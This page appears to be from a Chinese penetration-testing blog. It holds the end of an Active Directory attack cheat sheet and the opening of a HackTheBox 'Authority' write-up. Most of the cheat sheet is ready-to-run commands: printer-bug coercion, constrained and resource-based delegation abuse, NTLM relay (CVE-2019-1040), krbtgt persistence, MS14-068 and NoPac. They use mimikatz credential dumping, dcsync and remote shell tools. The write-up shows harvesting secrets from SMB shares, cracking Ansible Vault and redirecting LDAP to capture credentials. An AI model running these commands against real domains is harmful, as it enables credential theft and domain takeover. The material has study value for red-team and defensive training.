class="headerlink" title="利用打印机漏洞"></a>利用打印机漏洞</h4><p>强迫运行打印服务（Print Spooler）的主机向目标主机发起Kerberos或NTLM认真请求</p><p><strong>前提条件：</strong></p><ol><li>Administrator权限</li><li>域用户的账号密码</li><li>域控开启打印机</li></ol><p><strong>工具：</strong><a href="https://github.com/leechristensen/SpoolSample/" title="https://github.com/leechristensen/SpoolSample/">https://github.com/leechristensen/SpoolSample/</a></p><p><strong>利用过程：</strong></p><ol><li>查询打印服务是否开启（域控上查询）<br><code>sc query spooler</code></li><li>使用Rubeus监听来自域控的票据<br><code>Rubeus.exe monitor /interval:2 /filteruser:DC2016$</code></li><li>使用SpoolSample执行打印机漏洞利用，进行强制验证<br><code>SpoolSample.exe DC2016 WIN10-1</code></li><li>Rubeus监听到票据并导入该票据<br><code>Rubeus.exe /ptt /ticket:dt...</code></li><li>使用mimikatz导出Hash<br><code>mimikatz.exe &quot;lsadump::dcsync /domain:aut.htb /user:aut\Administrator&quot; &quot;exit&quot;</code></li></ol><h3 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a>约束性委派</h3><p>在约束委派的Kerberos中，同样会将TGT发送给相关受委派的服务，但由于S4U2proxy的影响，该票据只能访问指定的服务</p><h4 id="S4U2self"><a href="#S4U2self" class="headerlink" title="S4U2self"></a>S4U2self</h4><p>允许受约束委派的服务 <strong>（主动）代表任意用户向KDC请求服务自身</strong>，从而获取一张该用户（任意用户）的当前受约束委派服务的票据TGS（ST），该服务票据包含用户的相关信息，比如该用户的组信息等</p><h4 id="S4U2proxy"><a href="#S4U2proxy" class="headerlink" title="S4U2proxy"></a>S4U2proxy</h4><p>允许受约束委派的服务通过服务票据ST，代表用户去请求指定的服务</p><p>配置了约束委派的账户属性会有两个变化：</p><ol><li>账户的<code>userAccountControl</code>属性会被设置为<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，值为<code>16781312</code></li><li>账户的<code>msDS-AllowedToDelegateTo</code>属性，添加允许委派的服务</li></ol><h4 id="侦查思路：找到约束委派账户"><a href="#侦查思路：找到约束委派账户" class="headerlink" title="侦查思路：找到约束委派账户"></a>侦查思路：找到约束委派账户</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># AdFind.exe查询约束委派机器账户</span><br>AdFind.exe -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto<br><span class="hljs-comment"># AdFind.exe查询约束委派服务账户</span><br>AdFind.exe -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto<br><br><span class="hljs-comment"># 导入</span><br>powershell-import PowerView.ps1<br><span class="hljs-comment"># PowerView查询约束委派机器账户</span><br>powershell Get-DomainComputer -TrustedToAuth -domain redteam.lab -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize<br><span class="hljs-comment"># PowerView查询约束委派服务账户</span><br>powershell Get-DomainUser –TrustedToAuth -domain redteam.lab -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl<br><br></code></pre></td></tr></table></figure><p>约束委派共计的关键就是<strong>获得可转发的服务票据ST</strong></p><p>只要控制配置约束委派服务的机器，并获得它的密码。就可以劫持这台主机的kerberos请求，最终获得任意用户权限的ticket</p><h4 id="使用机器账户的票据"><a href="#使用机器账户的票据" class="headerlink" title="使用机器账户的票据"></a>使用机器账户的票据</h4><p><strong>利用条件：</strong></p><ol><li>需要Administrator权限</li><li>目标机器账户配置了约束性委派</li></ol><p><strong>利用过程：</strong></p><p>使用mimikatz工具导出Isass.exe进程中所有的票据，得到想要的服务票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导出票据</span><br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_K48nX9vZtL.png" alt=""></p><p>使用kekeo工具申请服务票据（S4U2Proxy）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 申请服务票据</span><br>kekeo.exe <span class="hljs-string">&quot;tgs::s4u /tgt:[0;3e7]-2-1-40e10000-WIN10-1<span class="hljs-variable">$@krbtgt</span>-REDTEAM.LAB.kirbi /user:Administrator@redteam.lab /service:cifs/DC2016.redteam.lab&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_DzgJwnlApq.png" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导入票据</span><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::ptt TGS_Administrator@redteam.lab@REDTEAM.LAB_cifs~DC2016.redteam.lab@REDTEAM.LAB.kirbi&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><span class="hljs-comment"># 访问</span><br><span class="hljs-built_in">dir</span> \\DC2016.redteam.lab\c$<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ptgvPyz844.png" alt=""></p><h4 id="使用机器账户的Hash值"><a href="#使用机器账户的Hash值" class="headerlink" title="使用机器账户的Hash值"></a>使用机器账户的Hash值</h4><p><strong>利用条件：</strong></p><ol><li>需要Administrator权限</li><li>目标机器账户配置了约束性委派</li></ol><p><strong>利用过程：</strong></p><p>使用mimikatz获取NTLM Hash值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_M3fFHJ-7LV.png" alt=""></p><p>使用getST申请服务票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 getST.py -dc-ip 10.10.2.20 -spn CIFS/DC2016.redteam.lab -impersonate administrator redteam.lab/WIN10-1$ -hashes :8f91f8786d308e62c609688886dc7c4c<br></code></pre></td></tr></table></figure><p>使用票据远程访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">KRB5CCNAME=administrator.ccache python3 wmiexec.py -k redteam.lab/administrator@DC2016.redteam.lab -no-pass -dc-ip 10.10.2.20<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_y47Ef1YU8I.png" alt=""></p><h3 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h3><p>Resource Based Constrained Delegation（RBCD）不需要通过具备SeEnableDelegationPrivilege权限的域管理员进行修改，<strong>而是将设置属性的权限给了服务资源本身</strong>。</p><p>配置了RBCD的账户属性有如下变化：</p><ul><li><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性指向委派账户</li></ul><p>可以将基于资源的约束性委派理解为传统的约束性委派的反向过程。</p><p>以A、B两个服务为例，约束性委派需要在A上设置<code>msDS-AllowedToDelegateTo</code>属性，以指定对B上的哪个服务进行委派。而RBCD需要在B上将<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性值设为A的SID，允许A对B上的服务进行委派</p><p>此外，在传统的约束性委派中，通过S4U2Self申请到的ST票据一定是可转发的，否则S4U2Proxy阶段将失败。但在RBCD中，不可转发的ST仍然可以通过S4U2Proxy阶段对其他服务进行委派认证。</p><h4 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h4><ol><li>具有对主机修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权利</li><li>可以创建机器账户（或已经知道机器账户）</li></ol><p><strong>具备修改msDS-AllowedToActOnBehalfOfOtherIdentity属性权限的用户：</strong></p><ol><li>将该主机加入域的用户账户<br>该账户中有一个<code>msDS-CreatorSID</code>属性，用于标记加入域时使用的用户账户SID</li><li>Account Operator组成员</li><li>该主机的机器账户</li></ol><p><strong>具备创建及其账户权限的用户：</strong></p><ol><li>一般域成员，由<code>msDS-MachineAccountQuota</code>属性决定，默认可以创建10个机器账户</li></ol><h4 id="侦查思路：找到可修改委派权限的用户"><a href="#侦查思路：找到可修改委派权限的用户" class="headerlink" title="侦查思路：找到可修改委派权限的用户"></a>侦查思路：找到可修改委派权限的用户</h4><ol><li>已知机器账户</li><li>找到使其加入域中的用户账户，这个用户账户就具备修改<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的权限</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用adfind.exe查找机器账户的mS-DS-CreatorSID属性</span><br>AdFind.exe -h 10.10.2.20 -u ken -up 123.com -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;objectClass=computer&quot;</span> mS-DS-CreatorSID<br><br><span class="hljs-comment"># 使用Powershell反查SID对应的用户</span><br>powerpick <span class="hljs-variable">$objSID</span> = New-Object System.Security.Principal.SecurityIdentifier S-1-5-21-3309395417-4108617856-2168433834-1104;<span class="hljs-variable">$objUser</span> = <span class="hljs-variable">$objSID</span>.Translate([System.Security.Principal.NTAccount]);<span class="hljs-variable">$objUser</span>.Value<br></code></pre></td></tr></table></figure><h4 id="侦查思路：由用户查找其加入域中的机器"><a href="#侦查思路：由用户查找其加入域中的机器" class="headerlink" title="侦查思路：由用户查找其加入域中的机器"></a>侦查思路：由用户查找其加入域中的机器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查用户账户SID</span><br><span class="hljs-built_in">whoami</span> /all<br><br><span class="hljs-comment"># 使用PowerView查经由该用户加入域内的机器账户(主机)</span><br><span class="hljs-comment"># 需要具备GeneriCall或WriteProperty等修改权限</span><br>powershell-import PowerView.ps1<br>powerpick Get-DomainObjectAcl | ?&#123;<span class="hljs-variable">$_</span>.SecurityIdentifier -match <span class="hljs-string">&quot;S-1-5-21-3309395417-4108617856-2168433834-1104&quot;</span>&#125; | select objectdn,activedirectoryrights<br></code></pre></td></tr></table></figure><h4 id="通过管理主机加入域的用户拿下主机"><a href="#通过管理主机加入域的用户拿下主机" class="headerlink" title="通过管理主机加入域的用户拿下主机"></a>通过管理主机加入域的用户拿下主机</h4><p><strong>关键：</strong> 能修改那台服务资源的委派属性，就能拿下该台主机</p><p><strong>利用条件：</strong></p><ol><li>允许创建机器账户</li><li>具有管理主机加入域的用户账户</li></ol><p><strong>利用过程：</strong></p><p>添加机器账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用addcpmputer创建机器账户</span><br>python3 addcomputer.py redteam.lab/ken:123.com -method LDAPS -computer-name CPT01\$ -computer-pass Passw0rd -dc-ip 10.10.2.20<br><br><span class="hljs-comment"># 使用bloodyAD工具创建机器账户</span><br>python3 bloodyAD.py -d redteam.lab -u ken -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT01 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br></code></pre></td></tr></table></figure><p>查询机器账户的SID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用 PowerView 工具查询机器账户SID</span><br>S-1-5-21-3309395417-4108617856-2168433834-1108<br></code></pre></td></tr></table></figure><p>修改服务资源的委派属性，即 msDS-AllowedToActOnBehalfOfOtherIdentity</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导入powershell Set-ExecutionPolicy Bypass -Scope Process. .\powerview.ps1</span><br>powershell-import PowerView.ps1<br>powerpick <span class="hljs-variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3309395417-4108617856-2168433834-1108)&quot;</span>;<span class="hljs-variable">$SDBytes</span> = New-Object byte[] (<span class="hljs-variable">$SD</span>.BinaryLength);<span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, 0);Get-DomainComputer WIN7-1 | Set-DomainObject -Set @&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; -Verbose<br><span class="hljs-comment"># 查询属性</span><br>powerpick Get-DomainComputer SERVER2012 -Properties msds-allowedtoactonbehalfofotheridentity<br><span class="hljs-comment"># 域控查询命令</span><br>Get-ADComputer SERVER2012 -Properties PrincipalsAllowedToDelegateToAccount<br><span class="hljs-comment"># 清除属性</span><br>Set-DomainObject SERVER2012 -Clear <span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span> -Verbose<br></code></pre></td></tr></table></figure><p>申请服务票据并利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用getST.py申请票据</span><br>python3 getST.py redteam.lab/CPT01$:Passw0rd -spn cifs/SERVER2012.redteam.lab -impersonate administrator -dc-ip 10.10.2.20<br><span class="hljs-comment"># 导入票据</span><br><span class="hljs-built_in">export</span> KRB5CCNAME=/root/Desktop/administrator.ccache<br><span class="hljs-comment"># 直接登录</span><br>python3 wmiexec.py -k redteam.lab/administrator@SERVER2012.redteam.lab -no-pass<br>python3 psexec.py -k redteam.lab/administrator@SERVER2012.redteam.lab -no-pass<br></code></pre></td></tr></table></figure><h4 id="已知Account-Operators组用户拿下主机"><a href="#已知Account-Operators组用户拿下主机" class="headerlink" title="已知Account Operators组用户拿下主机"></a>已知Account Operators组用户拿下主机</h4><p>可以获得域内除了域控之外的所有机器</p><p><strong>利用条件：</strong></p><ol><li>获得属于Account Operators组的用户账户</li><li>可以创建机器账户</li></ol><p>Acount Operators组成员能修改<strong>域内任意主机</strong><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性</p><p><strong>利用过程：</strong></p><p>查询Account Operators组成员</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adfind.exe -h 10.10.2.20:389 -s subtree -b CN=<span class="hljs-string">&quot;Account Operators&quot;</span>,CN=Builtin,DC=redteam,DC=lab member<br></code></pre></td></tr></table></figure><p>创建机器账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用bloodyAD.py创建机器账户</span><br>python3 bloodyAD.py -d redteam.lab -u mark -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT02 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br></code></pre></td></tr></table></figure><p>设置委派属性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用PowerView工具查询机器账户SID</span><br>powerpick Get-NetComputer CPT02 -Properties objectsid<br>S-1-5-21-3309395417-4108617856-2168433834-1112<br><br><span class="hljs-comment"># 修改服务资源msDS-AllowedToActOnBehalfOfOtherIdentity属性</span><br>powerpick <span class="hljs-variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3309395417-4108617856-2168433834-1112)&quot;</span>;<span class="hljs-variable">$SDBytes</span> = New-Object byte[] (<span class="hljs-variable">$SD</span>.BinaryLength);<span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, 0);Get-DomainComputer WIN7-1 | Set-DomainObject -Set @&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; -Verbose<br><br><span class="hljs-comment"># 查询属性</span><br>powerpick Get-DomainComputer WIN7-1 -Properties msds-allowedtoactonbehalfofotheridentity<br></code></pre></td></tr></table></figure><p>申请服务票据并利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建服务票据</span><br>python3 getST.py redteam.lab/CPT02$:Passw0rd -spn cifs/WIN7-1.redteam.lab -impersonate administrator -dc-ip 10.10.2.20<br><br><span class="hljs-comment"># 导入票据</span><br><span class="hljs-built_in">export</span> KRB5CCNAME=/root/Desktop/administrator.ccache<br><br><span class="hljs-comment"># 直接登录</span><br>python3 wmiexec.py -k redteam.lab/administrator@WIN7-1.redteam.lab -no-pass<br>python3 psexec.py -k redteam.lab/administrator@WIN7-1.redteam.lab -no-pass<br></code></pre></td></tr></table></figure><h4 id="结合HTML-Relay攻击拿下主机（CVE-2019-1040）"><a href="#结合HTML-Relay攻击拿下主机（CVE-2019-1040）" class="headerlink" title="结合HTML Relay攻击拿下主机（CVE-2019-1040）"></a>结合HTML Relay攻击拿下主机（CVE-2019-1040）</h4><p>绕过NTLM MIC校验+打印机漏洞+NTLM Relay+基于资源的约束性委派组合攻击</p><p><strong>利用条件：</strong></p><ol><li>目标开启打印机服务</li><li>能创建机器账户</li></ol><p><strong>利用过程：</strong></p><p>创建机器账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 bloodyAD.py -d redteam.lab -u ken -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT03 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br></code></pre></td></tr></table></figure><p>监听认证请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 ntlmrelayx.py -t ldap://10.10.2.20 -smb2support --remove-mic --delegate-access --escalate-user CPT03\$<br></code></pre></td></tr></table></figure><p>打印机漏洞执行强制认证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 printerbug.py redteam.lab/ken:123.com@10.10.2.50 10.10.2.77<br></code></pre></td></tr></table></figure><p>申请服务票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 getST.py redteam.lab/CPT03\$:Passw0rd -spn CIFS/SERVER2012.redteam.lab -impersonate Administrator -dc-ip 10.10.2.20<br></code></pre></td></tr></table></figure><p>使用服务票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 注入票据</span><br><span class="hljs-built_in">export</span> KRB5CCNAME=Administrator.ccache<br><br><span class="hljs-comment"># 远程访问</span><br>python3 smbexec.py -target-ip 10.10.2.50 -k SERVER2012.redteam.lab -no-pass<br></code></pre></td></tr></table></figure><h4 id="krbtgt用户委派"><a href="#krbtgt用户委派" class="headerlink" title="krbtgt用户委派"></a>krbtgt用户委派</h4><p>在获取到域控权限后，可以对krbtgt用户设置委派属性，以实现维持权限的目的</p><p><strong>利用条件：</strong></p><ol><li>获取域控权限</li></ol><p><strong>利用过程：</strong></p><p>设置委派属性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建机器账户</span><br>python3 bloodyAD.py -d redteam.lab -u ken -p <span class="hljs-string">&#x27;123.com&#x27;</span> --host 10.10.2.20 addComputer CPT04 <span class="hljs-string">&#x27;Passw0rd&#x27;</span><br><br><span class="hljs-comment"># 设置krbtgt委派权限 | 查询</span><br>Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount CPT04$<br>Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount<br></code></pre></td></tr></table></figure><p>申请&amp;使用票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 getST.py redteam.lab/CPT04\$:Passw0rd -spn krbtgt -impersonate Administrator -dc-ip 10.10.2.20<br><span class="hljs-built_in">export</span> KRB5CCNAME=Administrator.ccache<br><br>python3 smbexec.py -k administrator@DC2016.redteam.lab -no-pass -dc-ip 10.10.2.20<br>KRB5CCNAME=Administrator.ccache | python3 smbexec.py -k administrator@DC2016.redteam.lab -no-pass -dc-ip 10.10.2.20<br></code></pre></td></tr></table></figure><h2 id="PAC攻击"><a href="#PAC攻击" class="headerlink" title="PAC攻击"></a>PAC攻击</h2><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>MS14-068漏洞的原因是KDC无法正确检查PAC中的有效签名，由于其实现签名的加密允许所有的签名算法，只要客户端指定任意签名算法，KDC服务就会使用指定的算法进行签名验证，因此可以利用不需要相关密钥的算法，如MD5，实现内容的任意更改，导致用户可以自己构造一张PAC，伪造用户的SID和所在的组。</p><p>那么通过伪造的PAC，加入域管相关信息，访问域控服务，KDC会认为当前用户有权限，从而把这个用户当作域管组的成员，进而达到提升至域管理员的效果</p><p>在WIN2008上利用kekeo执行如下命令，便可以成功访问域控CIFS服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kekeo.exe <span class="hljs-string">&quot;exploit::ms14068 /domain:aurey.com /user:username /password:password /ptt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure><p>除此之外，也可以利用impacket中的goldenPac，直接返回一个交互式Shell</p><h3 id="CVE-2021-42278-amp-CVE-2021-42287（NoPac）"><a href="#CVE-2021-42278-amp-CVE-2021-42287（NoPac）" class="headerlink" title="CVE-2021-42278 &amp; CVE-2021-42287（NoPac）"></a>CVE-2021-42278 &amp; CVE-2021-42287（NoPac）</h3><p>CVE-2021-42278：机器账户的名字一般以<code>$</code>结尾，但AD没有对域内机器账户名做验证。导致机器用户名可以被冒用</p><p>CVE-2021-42287：假设域控名为DC（对应的机器账户为<code>DC$</code>），攻击者利用CVE-2021-42278创建一个机器账户<code>TEST$</code>，再把机器账户<code>TEST$</code>的sAMAccountName改成DC。此时用户DC申请一个TGT票据。再把DC的sAMAccountName改回<code>TEST$</code>。这时候KDC会判断域内没有DC这个账户，自动取搜索<code>DC$</code>（DC$是域控DC的sAMAccountName），攻击者利用刚刚申请的TGT进行S4U2Self，模拟域控去请求ST票据， 最终获得域控DC的权限。</p><p>工具：sam-the-admin：<a href="https://github.com/WazeHell/sam-the-admin" title="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python3 sam_the_admin.py <span class="hljs-string">&quot;king/windows03w:edcRFV222&quot;</span> <span class="hljs-literal">-dc-ip</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">204.146</span> <span class="hljs-literal">-shell</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Authority - HackTheBox</title>
    <link href="/2023/07/23/Authority-HackTheBox/"/>
    <url>/2023/07/23/Authority-HackTheBox/</url>
    
    <content type="html"><![CDATA[<p>开局先扫描</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_D8YDBtzGtN.png" alt=""></p><p>enum4linux找不到什么有用的信息，smbmap这边发现了可读的共享</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_rZMnI29qzH.png" alt=""></p><h2 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h2><h3 id="SMB-information-leakage"><a href="#SMB-information-leakage" class="headerlink" title="SMB information leakage"></a>SMB information leakage</h3><p>下载下来可以看到是个Ansible脚本</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_6KrDOksijT.png" alt=""></p><p>我重点看了PWM，因为8443端口开放着这个服务</p><p>配置文件中发现了：</p><ul><li>账户svc_pwm</li><li>Ansible账户：Administrator；密码：Welcome1</li><li>开启了WinRM</li><li>PWM系统的两个账户密码</li></ul><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HOYtIwcUDI.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7K-3dMRMiJ.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_8EVjvCQg-I.png" alt=""></p><p>直接WinRM登录一下这个administrator账户（确实不行，我也觉得没这么简单</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_98842n_UT4.png" alt=""></p><h3 id="PWM-Service"><a href="#PWM-Service" class="headerlink" title="PWM Service"></a>PWM Service</h3><p>那就是用PWM的用户密码登录上去看看能做什么</p><p>直接登录不行</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_pZuSdPZ_hj.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_5NvmcmfHKR.png" alt=""></p><p>只能再回到文件里看看，发现了真正的密码</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_PqoDEKxLTq.png" alt=""></p><h3 id="Crack-the-Ansible-Vault"><a href="#Crack-the-Ansible-Vault" class="headerlink" title="Crack the Ansible-Vault"></a>Crack the Ansible-Vault</h3><p>Google查了破解方法</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Bb72VRcd3O.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_99tiVHyxp_.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_mU-Wo3q-95.png" alt=""></p><p>整理一下解密出来的信息：</p><ul><li>ldap_admin_password：DevT3st\@123</li><li>pwm_admin_password：pWm <em>@dm!N</em>!23</li><li>pwm_admin_login：svc_pwm</li></ul><p>终于登录上了这个平台</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_acGjwUzfah.png" alt=""></p><p>但这里又被折磨了好久，也去Github和Google搜了很多这个项目的信息</p><p>最后在配置文件里看到了LDAP服务地址，回想起之前登录的时候一直在警告LDAP服务不可用，那么我们把这个地址改成自己的地址会怎么样呢？</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_oklhZUd9fM.png" alt=""></p><p>改完之后监听端口、再上传配置文件看看</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_YVEXxe6w6a.png" alt=""></p><p>直接乱码，可能是加密过后才发过来的，这里又将ldaps改成ldap</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_PHN5v2l1RD.png" 